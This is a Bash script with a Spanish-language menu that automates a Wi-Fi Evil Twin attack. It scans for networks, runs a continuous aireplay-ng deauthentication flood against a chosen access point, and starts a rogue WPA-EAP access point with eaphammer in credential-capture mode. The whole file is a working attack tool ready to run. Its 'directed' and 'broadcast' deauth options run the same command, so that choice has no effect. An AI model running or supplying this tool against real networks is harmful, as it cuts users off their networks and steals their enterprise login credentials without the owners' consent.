# Variables globales
stationPort=""
essidname=""
bssid_target=""
channel_target=""
deauth_pid=""

# Función para limpiar procesos al salir
cleanup() {
    echo ""
    echo -e "\033[33m[!] Deteniendo procesos...\033[0m"
    if [ ! -z "$deauth_pid" ]; then
        kill $deauth_pid 2>/dev/null
    fi
    # Restaurar modo managed
    if [ ! -z "$stationPort" ]; then
        sudo airmon-ng stop ${stationPort}mon 2>/dev/null
    fi
    echo -e "\033[32m[!] Limpieza completada\033[0m"
}

trap cleanup EXIT

until [ "$optport" = "5" ]
do
    echo -e "\e[1;31m$(cat logport 2>/dev/null)\e[0m"
    echo ""
    echo -e "\033[31m[-] Menu de opciones Evil Twin + Deauth: \033[0m"
    echo ""
    echo "[0] Crear el certificado de la red"
    echo "[1] Seleccionar la interfaz de red"
    echo "[2] Escanear y seleccionar red objetivo"
    echo "[3] Configurar ataque de deauthentication"
    echo "[4] Iniciar Evil Twin + Deauth"
    echo "[5] Salir"
    echo ""
    echo -e "\033[36m[*] Estado actual:\033[0m"
    echo ""
    echo "[-] Interfaz: ${stationPort:-No configurada}"
    echo "[-] Red objetivo: ${essidname:-No configurada}"
    echo "[-] BSSID objetivo: ${bssid_target:-No configurado}"
    echo "[-] Canal: ${channel_target:-No configurado}"
    echo ""
    read -p $'\e[33m[-] Elige una opcion: \e[0m' optport
    
    case $optport in
        0)
            echo ""
            echo -e "\033[32m[!] Creando el certificado de la red\033[0m"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            echo ""
            sudo eaphammer --cert-wizard
            echo ""
            echo -e "\033[32m[!] Certificado de red creado\033[0m"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        1)
            echo ""
            echo -e "\033[32m[!] Interfaces de red disponibles:\033[0m"
            echo ""
            iwconfig 2>/dev/null | grep -E "^[a-z]" | cut -d' ' -f1
            echo ""
            read -p $'\e[33m[-] Escriba el nombre de la interfaz (ej: wlan0): \e[0m' stationPort
            
            # Verificar que la interfaz existe
            if ! iwconfig $stationPort &>/dev/null; then
                echo ""
                echo -e "\033[31m[!] Error: La interfaz no existe o no soporta modo monitor\033[0m"
                stationPort=""
            else
                echo ""
                echo -e "\033[32m[!] Interfaz guardada correctamente\033[0m"
            fi
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        2)
            if [ -z "$stationPort" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Primero debe seleccionar una interfaz (opción 1)\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            echo ""
            echo -e "\033[32m[!] Poniendo interfaz en modo monitor...\033[0m"
            sudo airmon-ng start $stationPort > /dev/null 2>&1
            
            echo ""
            echo -e "\033[33m[!] Escaneando redes WiFi (30 segundos)...\033[0m"
            echo -e "\033[36m[*] Presione Ctrl+C cuando vea su red objetivo\033[0m"
            echo ""
            
            # Escanear redes
            sudo airodump-ng ${stationPort}mon
            
            echo ""
            echo -e "\033[32m[!] Escaneo completado\033[0m"
            echo ""
            read -p $'\e[33m[-] Escriba el ESSID (nombre) de la red objetivo: \e[0m' essidname
            read -p $'\e[33m[-] Escriba el BSSID (MAC) de la red objetivo: \e[0m' bssid_target
            read -p $'\e[33m[-] Escriba el CANAL de la red objetivo: \e[0m' channel_target
            
            echo ""
            echo -e "\033[32m[!] Configuración guardada:\033[0m"
	    echo ""
            echo "[*] ESSID: $essidname"
            echo "[*] BSSID: $bssid_target"
            echo "[*] Canal: $channel_target"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        3)
            if [ -z "$bssid_target" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Primero debe escanear y configurar la red objetivo (opción 2)\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            echo ""
            echo -e "\033[36m[*] Configuración del ataque de deauthentication:\033[0m"
            echo ""
            echo "[!] El ataque de deauth desconectará a los clientes del AP legítimo"
            echo "para que se conecten a tu Evil Twin."
            echo ""
            echo "[1] Deauth dirigido (a todos los clientes del AP)"
            echo "[2] Deauth broadcast (más agresivo)"
            echo ""
            read -p $'\e[33m[-] Seleccione el tipo de ataque [1-2]: \e[0m' deauth_type
            echo ""
            case $deauth_type in
                1)
                    deauth_mode="directed"
                    echo -e "\033[32m[!] Modo dirigido seleccionado\033[0m"
                ;;
                2)
                    deauth_mode="broadcast"
                    echo -e "\033[32m[!] Modo broadcast seleccionado\033[0m"
                ;;
                *)
                    deauth_mode="directed"
                    echo -e "\033[33m[!] Modo por defecto: dirigido\033[0m"
                ;;
            esac
            
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        4)
            if [ -z "$stationPort" ] || [ -z "$essidname" ] || [ -z "$bssid_target" ] || [ -z "$channel_target" ]; then
                echo ""
                echo -e "\033[31m[!] Error: Faltan configuraciones. Complete las opciones 1, 2 y 3 primero\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
                clear
                continue
            fi
            
            echo ""
            echo -e "\033[32m[!] Iniciando ataque Evil Twin + Deauth\033[0m"
            echo ""
            echo -e "\033[33m[*] Configuración del ataque:\033[0m"
	    echo ""
            echo "[-] Red objetivo: $essidname"
            echo "[-] BSSID objetivo: $bssid_target"
            echo "[-] Canal: $channel_target"
            echo "[-] Interfaz: ${stationPort}mon"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para iniciar el ataque: \e[0m' ENTER
            
            # Asegurar que la interfaz está en modo monitor
            sudo airmon-ng start $stationPort > /dev/null 2>&1
            
            echo ""
            echo -e "\033[36m[!] Iniciando ataque de deauthentication en segundo plano...\033[0m"
            
            # Iniciar deauth en segundo plano
            if [ "$deauth_mode" = "broadcast" ]; then
                # Deauth broadcast (más agresivo)
                sudo aireplay-ng --deauth 0 -a $bssid_target ${stationPort}mon > /dev/null 2>&1 &
            else
                # Deauth dirigido (por defecto)
                sudo aireplay-ng --deauth 0 -a $bssid_target ${stationPort}mon > /dev/null 2>&1 &
            fi
            echo ""
            deauth_pid=$!
            echo -e "\033[32m[✓] Deauth iniciado (PID: $deauth_pid)\033[0m"
            
            sleep 2
            
            echo ""
            echo -e "\033[36m[!] Iniciando Evil Twin con eaphammer...\033[0m"
	    echo ""
            echo -e "\033[33m[*] Presione Ctrl+C para detener el ataque\033[0m"
            echo ""
            
            # Detener modo monitor para que eaphammer lo maneje
            sudo airmon-ng stop ${stationPort}mon > /dev/null 2>&1
            
            # Iniciar Evil Twin (esto bloqueará hasta que termine)
            sudo eaphammer -i $stationPort --channel $channel_target --auth wpa-eap --essid "$essidname" --creds
            
            # Cuando termine eaphammer, matar el proceso de deauth
            kill $deauth_pid 2>/dev/null
            deauth_pid=""
            
            echo ""
            echo -e "\033[32m[!] Ataque finalizado\033[0m"
            echo ""
            read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m' ENTER
            clear
        ;;
        
        5)
            clear
            echo -e "\033[32m[!] Volviendo al menu principal\033[0m"
            echo ""
        ;;
        
        *)
            clear
            echo -e "\033[31m[!] Opcion invalida, repita de nuevo.\033[0m"
            echo ""
        ;;
    esac
done
